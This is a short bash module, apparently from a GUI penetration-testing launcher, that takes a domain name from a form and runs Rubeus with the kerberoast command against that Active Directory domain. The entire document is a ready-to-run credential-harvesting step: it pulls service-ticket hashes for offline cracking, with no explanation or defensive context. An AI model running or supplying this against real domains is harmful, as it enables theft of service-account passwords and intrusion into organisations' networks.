#!/bin/bash

: '
Rubeus: perform kerberoast attack on domain
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")

# Generate GUI form
generate_form "${DOMAIN_FIELD}"

DOMAIN=${form_data["domain"]}

execute_command ".\Rubeus.exe kerberoast /domain:${DOMAIN} /nowrap"
create_new_line
